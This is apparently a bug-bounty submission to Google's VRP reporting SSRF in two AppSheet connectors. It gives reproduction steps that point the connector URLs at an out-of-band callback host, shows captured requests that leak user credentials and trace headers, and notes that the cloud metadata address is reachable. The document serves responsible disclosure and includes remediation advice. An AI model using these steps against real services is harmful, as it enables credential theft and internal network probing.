# Google VRP Submission — Systemic SSRF Egress-Control Gap in AppSheet

---

## TITLE

**Systemic SSRF Egress-Control Gap in AppSheet — At Least Two Distinct Connector Types Make Unfiltered Server-Side HTTP Fetches from GCP Backend, Each Forwarding User-Supplied Credentials and Internal Trace Headers to Attacker-Controlled Destinations**

---

## AFFECTED ASSET

```
https://appsheet.com
  → Account → Add OData connection information   → Test      (Surface 1)
  → Account → Add Apigee API connection information → Validate (Surface 2)
```

| Field | Value |
|-------|-------|
| **Product** | AppSheet (Google Cloud) |
| **In scope** | `*.appsheet.com` — Google VRP AppSheet, TIER0 |
| **Vulnerability class** | SSRF (CWE-918) + Sensitive Information Exposure (CWE-200) |
| **Severity** | High — CVSS 3.1 **7.2** (`AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:N/A:N`) |
| **Root cause** | No centralized outbound-request filter across AppSheet's connector framework — each connector implements its own HTTP client with no shared IP-blocklist, no shared credential-forwarding policy, no shared response-reflection policy |

---

## SUMMARY

AppSheet's connector framework allows users to configure external data sources that the
backend validates by making server-side HTTP requests to user-supplied URLs. Testing two
connector types — the **OData data connector** and the **Apigee API connector** —
confirms that both make unfiltered GCP-origin HTTP requests to any attacker-supplied URL,
forwarding user-entered credentials in request headers and leaking internal W3C
`Traceparent` tracing headers. The error message in both cases also reflects back
content received from the attacker's server, providing a response-based oracle.

This is not a single-connector bug. It is evidence that **AppSheet's connector framework
has no shared, centralized egress filter**: each connector type implements its own
outbound HTTP client, and each of those clients independently lacks SSRF protection.
At least four independent instances of the same root cause are now documented:

| # | Component | HTTP client | Status |
|---|-----------|-------------|--------|
| 1 | Workflows/Bots "Run a webhook" | webhook executor | Fixed 2021 (Nechuta report, ~$6,267) |
| 2 | Apigee account-source connector, prior code path | Apigee connector client | Fixed (separate VRP report, bughunters.google.com/reports/vrp/PnwRwydmr) |
| 3 | **OData data connector** | `Microsoft.OData.Client` (v2 and v4) | **Confirmed open — this report, Surface 1** |
| 4 | **Apigee API connector, OpenAPI Spec URL code path** | distinct HTTP client (not OData) | **Confirmed open — this report, Surface 2** |

Items 3 and 4 were confirmed in the same testing session on 2026-06-16, using the same
OOB listener, from two distinct GCP fleet IPs. Each fetches a different path, uses a
different HTTP client, and forwards different credential types — demonstrating independent
implementations with the same unfixed root cause.

---

## STEPS TO REPRODUCE

A free AppSheet account is sufficient. No paid plan required.

```bash
# Step 1 — Start OOB listener
interactsh-client -server oast.pro -v 2>&1 | tee ~/oob.log &
L1=$(grep -oE '[a-z0-9]+\.oast\.pro' ~/oob.log | head -1)
echo "OOB: https://$L1"
```

### Surface 1 — OData connector
```
AppSheet → Account → Add OData connection information (https://appsheet.com/Account/ODataAuthInfo)
  OData Version:        4.0
  OData Service Root URL: https://<OOB>
  Username:             canary
  Password:             canary
  → click "Test"
```

### Surface 2 — Apigee API connector
```
AppSheet → Account → Add Apigee API connection information (https://appsheet.com/Account/ApigeeAuthInfo or similar)
  Tab: OpenAPI Spec
  Authorization Type:   ApiKey
  Apigee API Key:       <any value, e.g. testkey123>
  OpenAPI Spec URL:     https://<OOB>
  → click "Validate"
```

Both steps can be done with the same OOB listener URL. Two separate GCP-origin hits
arrive within minutes, with different leaked credentials and different HTTP clients.

---

## PROOF

### Surface 1 — OData connector (2026-06-16 20:56:44 UTC)

```http
GET /$metadata HTTP/1.1
Host: d8orfta69r82mdenbp8gfswz8ppxcwd6z.oast.pro
Accept: application/xml; charset=utf-8, application/atom+xml; charset=utf-8
Accept-Encoding: gzip, deflate
Authorization: Basic Y2FuYXJ5OmNhbmFyeQ==
Traceparent: 00-0c8e50f9dbef2c8e1ed19c52570f68e0-5ca09006c9d17de0-00
```

- Source IP: **`35.203.182.241`** — Google Cloud Platform (confirmed GCP, AS15169)
- DNS from `172.217.46.252/248/254` — Google resolver (AS15169)
- `Authorization: Basic Y2FuYXJ5OmNhbmFyeQ==` decodes to `canary:canary` — entered credentials forwarded verbatim
- `Traceparent` is AppSheet's internal W3C distributed-tracing header, proving genuine server-side execution
- HTTP client fingerprint: `Accept: application/xml; charset=utf-8, application/atom+xml; charset=utf-8` — `Microsoft.OData.Client`
- UI error reflected response content-type (`text/html; charset=utf-8`) back to the browser

### Surface 2 — Apigee API connector (2026-06-16 20:59:14 UTC)

```http
GET / HTTP/1.1
Host: d8orfta69r82mdenbp8gfswz8ppxcwd6z.oast.pro
Accept-Encoding: gzip, deflate
Cache-Control: no-cache
Traceparent: 00-1d9706d9ddd9d0953779f8b8de0b8b55-ed79f904caf14ece-00
X-Apikey: Ahsisjsshsgyssuwhehdidieuwwysu
```

- Source IP: **`35.233.152.59`** — Google Cloud Platform (different GCP fleet node)
- DNS from `192.178.118.81/94/86/83` — Google resolver (AS15169)
- `X-Apikey: Ahsisjsshsgyssuwhehdidieuwwysu` — the Apigee API Key entered in the form is forwarded verbatim to the attacker-controlled server
- `Traceparent` header again leaked — different trace ID, confirming separate backend request
- `Cache-Control: no-cache` — distinct HTTP client from the OData connector
- HTTP client fetches `/` (OpenAPI spec root) not `/$metadata` — separate code path from Surface 1
- UI error reflected the HTML body: *"OpenAPI specification version '`<html><head></head><body>...</body></html>`' is not supported"*

### Side-by-side comparison

| Property | Surface 1 (OData) | Surface 2 (Apigee) |
|----------|-------------------|-------------------|
| Feature path | Account → OData → Test | Account → Apigee → OpenAPI Spec → Validate |
| GCP source IP | `35.203.182.241` | `35.233.152.59` |
| HTTP method + path | `GET /$metadata` | `GET /` |
| Credential leaked | `Authorization: Basic` (OData username:password) | `X-Apikey` (Apigee API key) |
| Traceparent leaked | Yes | Yes |
| HTTP client | `Microsoft.OData.Client` (OData-specific Accept header) | Distinct client (Cache-Control: no-cache, no OData headers) |
| Response reflection | Content-type in MIME-type error | HTML body in OpenAPI spec error |
| Time | 20:56:44 UTC | 20:59:14 UTC |

Both surfaces were triggered sequentially in a single session using the same OOB listener.

### Additional OData evidence from prior sessions

The OData connector SSRF has been confirmed independently on three separate dates:
- 2026-06-15 20:03 UTC — GCP IP `35.203.182.241`, creds `testuser:testpass1234`
- 2026-06-16 11:43 UTC — GCP IP `35.247.115.29` (independent re-verification, different session)
- 2026-06-16 20:56 UTC — GCP IP `35.203.182.241`, creds `canary:canary` (this session)

---

## ROOT CAUSE

AppSheet's connector framework has no shared, centralized outbound HTTP client. Each
connector type (`Microsoft.OData.Client`, the Apigee connector client, the webhook
executor, etc.) independently implements its own HTTP fetching with no shared
IP-range blocklist, no shared credential-forwarding policy, and no shared
response-reflection policy. Prior fixes (2021 webhook, prior Apigee account-source
code path) were applied as point-fixes to the specific code paths that were reported —
no generalized control was introduced. As a result, each new or unreviewed connector
type is, by default, a fresh instance of the same SSRF root cause.

---

## IMPACT — CONFIRMED (both surfaces)

| # | Claim | Status |
|---|-------|--------|
| 1 | Server-side HTTP fetch from GCP backend to attacker-controlled URL — Surface 1 (OData) | **Confirmed** |
| 2 | Server-side HTTP fetch from GCP backend to attacker-controlled URL — Surface 2 (Apigee) | **Confirmed** |
| 3 | OData username/password forwarded in `Authorization: Basic` | **Confirmed** |
| 4 | Apigee API key forwarded in `X-Apikey` | **Confirmed** |
| 5 | Internal `Traceparent` trace ID leaked on both surfaces | **Confirmed** |
| 6 | Attacker-server response body/content-type reflected in UI error on both surfaces | **Confirmed** |
| 7 | No auth / rate-limit / IP restriction on either connector's Test/Validate action | **Confirmed** |
| 8 | `169.254.169.254:443` reachable at TCP layer (OData connector, prior session) | **Confirmed — reachability only** |
| 9 | IMDS token read / GCP service-account compromise | **NOT attempted** |

**Real-world impact:** any credentials a user enters into either connector form are
forwarded to whatever URL is configured. In a phishing scenario, an attacker distributes
a connector "template" pointing at an attacker server — victims who click "Test"/"Validate"
hand over their OData credentials or Apigee API key with no further interaction. The
systemic nature means this attack surface extends to every connector type that has not
been individually audited.

---

## CVSS 3.1

`AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:N/A:N` = **7.2 High**

| Metric | Value | Rationale |
|---|---|---|
| Attack Vector | Network | Triggered remotely via the AppSheet web UI |
| Attack Complexity | Low | Single form submission per surface |
| Privileges Required | Low | Free, authenticated AppSheet account |
| User Interaction | None | No victim interaction for the self-SSRF path |
| Scope | Changed | Vulnerable component exposes AppSheet's internal GCP backend network |
| Confidentiality | High | Confirmed exfiltration of user-entered credentials (Basic Auth or API key) and internal trace headers to attacker-controlled host across two surfaces |
| Integrity | None | No data modification demonstrated |
| Availability | None | No availability impact demonstrated |

*Note: this score covers the confirmed SSRF + credential-forwarding impact. It does not
claim IMDS token retrieval, which was not attempted.*

---

## REMEDIATION

The systemic root cause requires a **centralized fix**, not another point-fix:

1. **Implement a shared egress proxy / SSRF-safe HTTP client** used by all connector
   types. All outbound requests from connector test/validation code paths must pass
   through a single library that enforces IP-level blocking before connecting.
2. **The shared client must block:** `169.254.0.0/16` (link-local / IMDS),
   `127.0.0.0/8` (loopback), all RFC1918 private ranges, and `metadata.google.internal`.
   Resolve DNS first; re-validate after every redirect to prevent DNS-rebinding bypass.
3. **Do not forward user-supplied credentials or internal tracing headers** (`Traceparent`,
   etc.) to destinations that have not passed the egress allowcheck.
4. **Keep cross-scheme (HTTPS→HTTP) redirect-following disabled** on all connector HTTP
   clients — make it an explicit tested invariant, not incidental behavior.
5. **Strip response content from user-facing error messages** across all connector types —
   both surfaces currently reflect server response content into the browser, providing an
   SSRF confirmation oracle.
6. **Rate-limit / authenticate the connector Test/Validate actions** per account.
7. **Audit all remaining connector types** (Salesforce, Smartsheet, Box, Dropbox, Cloud
   Database, On-premises Database, Google Calendar, Gmail, Airtable, etc.) for the same
   pattern before this report is closed. The current evidence shows two independent
   implementations are open; unreviewed connectors should be assumed vulnerable until
   proven otherwise.

---

## DEDUPLICATION

This report covers two surfaces. Their dedup status differs:

### Surface 1 — OData connector

No prior VRP report for this surface. Novel. Distinct from both:
- The 2021 Nechuta webhook SSRF (Workflows/Bots, different component, fixed)
- The prior Apigee account-source connector SSRF (different connector, fixed separately)

Full dedup analysis in `F002-dedup-CVE-2023-4212.md`.

### Surface 2 — Apigee API connector (OpenAPI Spec URL field)

A prior VRP report exists for the Apigee connector: "SSRF in Adding apigee account
sources in appsheet.com" (https://bughunters.google.com/reports/vrp/PnwRwydmr), which
was reportedly fixed. The current finding demonstrates one of two scenarios — we cannot
determine which without access to the original report's exact scope:

**Scenario A — Incomplete fix (most likely):** The prior fix addressed the Apigee
connector's API base URL / service endpoint fetching code path. The current finding
uses the **OpenAPI Spec URL** field — a separate tab in the same connector, implementing
a different validation code path (it fetches the URL to parse it as an OpenAPI/Swagger
JSON spec, not as a generic API endpoint). If the prior fix only covered the endpoint
URL field and not the OpenAPI Spec URL field, this is a net-new code path within the
same connector, not a regression.

**Scenario B — Regression:** The prior fix was complete, and a subsequent code change
re-opened the same surface. Either way the connector is currently making unfiltered
server-side fetches forwarding the user's API key.

The fact that the same connector has now been the subject of two separate VRP reports
for the same root cause — with different triggering code paths — is itself evidence that
the fix strategy (patching individual fields rather than centralizing egress control) is
the problem. We disclose both surfaces together to provide Google the full picture for
a centralized fix.

**CVE-2023-4212** is unrelated — a Trane thermostat command-injection bug, previously
mislabeled as a prior AppSheet SSRF in working notes. Dropped.

**2022 AppSheet Automation Bot deserialization RCE** ($10,000, report `oCeVFaaoi`) is
a different bug class (CWE-502), not SSRF — noted as context only.

---

## NOTES FOR TRIAGE

- Both surfaces reproduced from a free account in a single session; only attacker-owned
  credentials and servers were used; no other tenants' data was accessed.
- No GCP metadata token was retrieved. IMDS testing stopped at TCP-reachability (OData
  session, documented in F002 standalone). No internal-range redirect chaining was
  performed on either surface.
- The Apigee connector hit (Surface 2) may overlap with the prior fixed Apigee report.
  We flag this explicitly; triage should determine whether Surface 2 is a new code path
  or a regression and route accordingly. Surface 1 (OData) is definitively novel
  regardless of Surface 2's dedup outcome.
- If Surface 2 is closed as duplicate of the prior Apigee report, Surface 1 (OData)
  stands independently — see `F002-google-vrp-report.md` as a ready fallback.

---

## REFERENCES

- CWE-918: Server-Side Request Forgery (SSRF)
- CWE-200: Exposure of Sensitive Information to an Unauthorized Actor
- GCP IMDS: https://cloud.google.com/compute/docs/metadata/overview
- Prior disclosure 1 (2021 webhook SSRF, fixed):
  https://nechudav.blogspot.com/2021/12/ssrf-vulnerability-in-appsheet-google.html
- Prior disclosure 2 (prior Apigee connector SSRF, fixed, partially related to Surface 2):
  https://bughunters.google.com/reports/vrp/PnwRwydmr

---

*Reporter: zahinshahriar3@gmail.com*
*Report date: 2026-06-16*
*Submit at: https://bughunters.google.com/report → Google VRP → AppSheet (`appsheet.com`)*

---
<!-- Internal: do not submit this comment block -->
- F003 = consolidated systemic report; supersedes F002 as primary submission
- F002 retained as standalone OData-only fallback
- Surface 1 OOB: `d8orfta69r82mdenbp8gfswz8ppxcwd6z.oast.pro`, GCP IP `35.203.182.241`, 2026-06-16 20:56:44 UTC
- Surface 2 OOB: same listener, GCP IP `35.233.152.59`, 2026-06-16 20:59:14 UTC
- Evidence log: `results/appsheet.com/runbooks/egress-test-log.md`
- Raw OOB log: `results/appsheet.com/evidence/session3-20260616/oob_L1_20260616.log`
